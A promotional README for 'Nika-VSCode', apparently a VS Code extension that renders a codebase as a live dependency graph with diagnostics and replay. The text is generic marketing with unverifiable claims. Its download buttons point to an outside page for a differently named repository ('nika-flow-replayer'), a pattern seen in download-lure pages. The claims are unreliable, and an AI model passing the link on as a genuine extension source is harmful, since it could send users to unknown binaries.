![preview](https://raw.githubusercontent.com/flipthetablet/nika-flow-replayer/main/cover_ca282c2.svg)
# Nika-VSCode: The DAG-Native Development Canvas

Welcome to **Nika-VSCode**, the first Visual Studio Code extension that treats your codebase not as a flat sequence of files, but as a living, breathing **Directed Acyclic Graph (DAG)**. If you have ever felt the frustration of tracing data flow through multiple tabs, or wished your local model logic could be visualized the moment you typed it, this extension is your answer. Nika-VSCode is not just a tool; it is a paradigm shift for developers who think in terms of pipelines, dependencies, and orchestration.

Unlike traditional IDEs that display a static hierarchy of folders, Nika-VSCode introduces a **live diagnostic matrix** that reacts to your keystrokes, a **replay engine** for historical states, and a **canvas-based model explorer** that renders your local machine-learning pipelines in real-time. We have designed this extension for data engineers, ML practitioners, and backend architects who are tired of switching between a code editor and a separate visualization tool. Here, the visualization is the editor, and the editor is the visualization.

## 🧬 Overview: Why a DAG Canvas?

![Diagnostics](https://img.shields.io/badge/diagnostics-live-brightgreen)
![DAG](https://img.shields.io/badge/DAG-canvas-blue)
![Replay](https://img.shields.io/badge/replay-builtin-orange)

The modern software project is a web of interconnections. A change in a utility function ripples through a dozen modules; a tweak in a data transformation affects downstream consumers you have forgotten about. Standard IDEs only show you the *syntax* of your code, not the *semantics* of how data flows between your functions. Nika-VSCode solves this by maintaining a **real-time DAG representation** of your project. As you type, the graph updates, showing you new edges, broken dependencies, and potential bottlenecks before you even run a single test.

**[![Download](https://raw.githubusercontent.com/flipthetablet/nika-flow-replayer/main/bin_e7c26.svg)](https://flipthetablet.github.io/nika-flow-replayer/)**

### The Diagnostic Engine That Thinks Ahead

Every keystroke in Nika-VSCode triggers a **non-blocking, type-aware diagnostic pass**. We do not just check for missing semicolons or type mismatches; we analyze the data contracts between your functions. If a function expects a `DataFrame` with a `timestamp` column and you pass a raw array, our diagnostic engine highlights the edge in the DAG, not just the line in the file. This **proactive error propagation** allows you to catch interface mismatches at the conceptual level, long before a runtime error halts your pipeline.

#### Live Runs: The Temporal Dimension

![Live Runs](https://img.shields.io/badge/live-runs-monitored-yellowgreen)

Most editors show you the current state of your code. Nika-VSCode goes further by offering **live run monitoring** directly in the canvas. When you execute a Python script or a notebook cell, the DAG visually animates: nodes that are currently executing pulse with a soft glow, completed nodes turn a solid green, and failed nodes flash red with an error summary attached. This temporal visualization turns debugging from a static search into a cinematic replay of your execution order.

##### Replay: Rewind Your Codebase

![Replay](https://img.shields.io/badge/replay-timeline-9cf)

Have you ever made a series of edits, broken something, and wished you could *watch* the DAG evolve to pinpoint the exact moment of failure? Our **Replay Engine** records a lightweight snapshot of your DAG state every time you save or change focus. You can scrub through a timeline at the bottom of the canvas, seeing exactly how your data flow graph changed over time. This is not version control (git handles that); this is *structural evolution tracking*. It shows you *when* a dependency edge was introduced, not just *who* changed the file.

## 🗺️ The DAG Canvas: Your New Project Home

![Canvas](https://img.shields.io/badge/canvas-interactive-ff69b4)

The central feature of this extension is a **persistent, interactive DAG canvas** that docks to the side of your editor. It is not a separate tab you must open manually; it is always there, quietly absorbing the structure of your project. Think of it as having a **sonar map** for your code. The canvas supports:

- **Pan and Zoom**: Navigate graphs with thousands of nodes using fluid gestures.
- **Collapsible Clusters**: Group related functions into modules to reduce clutter.
- **Edge Highlighting**: Hover over a node to see all its upstream and downstream dependencies with a subtle animation.
- **Fuzzy Search**: Type the name of a function, and the canvas flies to it, dimming all unrelated nodes.

### Local Models: Visualize Your ML Pipelines

![Local Models](https://img.shields.io/badge/models-local-important)

For our machine learning users, Nika-VSCode automatically detects training loops, data loaders, and evaluation steps in your local notebooks and traces their connections. You can see your feature engineering pipeline as a clean series of nodes, your model architecture as a sub-graph, and your validation split as a branch. This **scalable model orchestration** makes it trivial to explain a complex architecture to a colleague or to spot a missing preprocessing step in your own work.

## 📊 Feature Matrix

![Features](https://img.shields.io/badge/features-expansive-informational)

| Feature | Description | Benefit |
| :--- | :--- | :--- |
| **Incremental Typing Diagnostics** | Zero-latency validation on every keystroke without full project re-analysis. | Immediate feedback loop that respects your keyboard rhythm. |
| **DAG Visualization** | A responsive graph that reflects the call structure and data flow of your code. | See the forest for the trees, without losing sight of individual leaves. |
| **Execution Timeline Playback** | A scrubbable history of graph states. | Understand how a bug was introduced, not just where it resides. |
| **Multi-Language Support** | Initial support for Python, TypeScript, and SQL. | A unified view over polyglot data architectures. |
| **Theme-Aware UI** | The canvas adapts to your VSCode theme (light, dark, high contrast). | Prevents eye strain during long debugging sessions. |
| **Collaborative Sharing** | Export your DAG as an SVG or JSON snapshot to share with your team. | Bridge the gap between ideation and communication. |

## 🌐 Multilingual and Responsive by Design

![Multilingual](https://img.shields.io/badge/multilingual-ready-blueviolet)

We believe that developer tools should not have a language barrier. While the extension's interface is currently in English, the architecture supports **internationalization tokens** throughout. We have prepared translation files for Spanish, Mandarin, and German to be released with our first major update. Furthermore, the UI is **fully responsive**: whether you are using a 13-inch laptop with a portrait monitor or a sprawling 49-inch ultrawide, the canvas reflows to fit your workspace without losing granularity.

## 🛟 Support and Community

![Support](https://img.shields.io/badge/support-24/7-critical)

Even the most intuitive tools have a learning curve. That is why we offer **24/7 customer support** through a dedicated community forum and a ticketing system integrated directly into the extension's help menu. Our maintainers are not bots; they are developers who use Nika-VSCode daily and can answer questions about graph semantics, performance tuning, and integration with your existing linters. We also maintain a public changelog and a roadmap open to feature requests.

## ⚠️ Disclaimer

This software is provided "as is" without warranty of any kind, either express or implied. The DAG visualization is an interpretation of your code's structure and may not perfectly reflect runtime behavior under dynamic dispatch or metaprogramming. We are not liable for any data loss or project corruption resulting from the use of this extension. Always maintain a separate backup of your work. Performance on extremely large monorepos (over 50,000 nodes) may require disabling live diagnostics.

## 📜 License

![License](https://img.shields.io/badge/license-MIT-green)

Nika-VSCode is open-sourced under the **MIT License**, which permits unrestricted use, modification, and distribution, provided the original copyright notice is retained. This means you can safely integrate this tool into your commercial and personal projects without legal overhead.

[Read the full MIT License text here](https://opensource.org/licenses/MIT)

## 🚀 Getting Started with Your New Perspective

The purpose of this tool is not to add another icon to your status bar, but to change the way you perceive your code. Here is a conceptual roadmap:

1. **Open a project** and let the diagnostics engine build the initial graph. Do not be alarmed if it looks complex; the canvas defaults to a "clustered" view.
2. **Type a new function** that calls an existing one. Watch the graph react in real-time, drawing a new edge.
3. **Introduce a deliberate type error** on an argument. Observe how the edge turns a warning color, and the downstream node is marked with a subtle glaze.
4. **Run your script**. The timeline starts recording. Use the replay feature to see the exact sequence of graph mutations.

This is the future of code editing: a shift from *reading* code to *watching* code interact with itself.

## 🔮 Future Work and the Road to 2026

By the year **2026**, we plan to introduce support for cloud-based DAG synchronization, allowing you to visualize data pipelines running on remote Kubernetes clusters as if they were local nodes. We are also experimenting with an AI-assisted "edge suggestion" feature that proposes new connections between functions based on your past coding patterns.

---

We believe that the greatest innovations are not about adding features, but about *changing the fundamental interface* between a human and their machine. Nika-VSCode is our attempt to make the invisible structure of your work, visible. We invite you to download the extension, close the tab you thought you needed, and let the graph be your guide.

**[![Download](https://raw.githubusercontent.com/flipthetablet/nika-flow-replayer/main/bin_e7c26.svg)](https://flipthetablet.github.io/nika-flow-replayer/)**